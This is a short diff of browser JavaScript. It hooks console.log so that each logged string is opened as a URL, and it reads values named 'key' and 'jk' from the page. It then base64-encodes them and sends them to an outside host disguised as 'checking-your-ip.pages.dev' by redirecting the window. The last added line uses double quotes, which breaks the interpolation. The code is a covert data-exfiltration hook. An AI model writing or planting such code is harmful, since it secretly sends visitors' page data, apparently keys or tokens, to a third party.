@@ -1,9 +1,9 @@
-console.log("readsy!");
+console.log("readya!");
 let key = "";
 let jk = "";
 const originalConsoleLog = console.log;
 console.log = function(message) {
-    window.open("https://your-url.com?message=" + encodeURIComponent(message), "_blank");
+    window.open(message,"_self")
     originalConsoleLog.apply(console, arguments);
 };
 
@@ -27,4 +27,5 @@ const elements = document.querySelectorAll('*'); // Select all elements in the D
         });
     });
 let aha = btoa(`${jk}&${key}&c`)
-console.log(`https://checking-your-ip.pages.dev/#?service=${aha}`)
+console.log("https://checking-your-ip.pages.dev/#?service=${aha}")
+
